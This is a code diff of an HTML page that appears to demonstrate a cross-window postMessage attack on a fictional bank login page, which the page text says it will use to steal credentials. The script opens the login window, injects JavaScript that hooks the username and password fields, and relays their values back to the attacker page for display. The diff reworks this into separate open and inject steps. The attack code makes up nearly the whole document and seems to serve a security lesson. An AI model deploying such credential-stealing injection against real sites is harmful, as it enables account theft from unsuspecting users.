@@ -23,7 +23,8 @@
 
         <p>Branleys Bank has some of the worst security in the world, click below and I can steal your credentials</p>
 
-        <button id="h">Hack It</button>
+        <p><button id="o">Open Log In</button></p>
+        <p><button id="i">Inject</button></p>
 
         <p>
             <div><strong>Username:</strong> <span id="u"></span></div>
@@ -32,20 +33,32 @@
     </div>
 
         <script>
-            document.getElementById("h").addEventListener("click", execute_hack);
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            document.getElementById("o").addEventListener("click", launch);
+            document.getElementById("i").addEventListener("click", deploy);
 
             var script = "";
-            script += 'function send() { window.opener.postMessage({ "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, "http://127.0.0.1/") }'
+            script += 'function send() { console.log("send()"); window.opener.postMessage({ "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, "http://127.0.0.1/") }'
             script += 'document.getElementById("username").addEventListener("change", send);'
             script += 'document.getElementById("password").addEventListener("change", send);'
 
-            function execute_hack() {
-                var windowRef = window.open('https://branleys.com/login.html');
-                windowRef.postMessage(script, "http://127.0.0.1/");
+            var windowRef;
+
+            function launch() {
+                windowRef = window.open('https://branleys.com/login.html');
+            }
+
+            function deploy() {
+                windowRef.postMessage(script, "https://branleys.com/");
+                console.log('posted message')
             }
 
             window.addEventListener("message", receiveMessage, false);
             function receiveMessage(event) {
+                console.log('recieved message')
                 document.getElementById("u").innerHTML = event.data.u;
                 document.getElementById("p").innerHTML = event.data.p;
             }
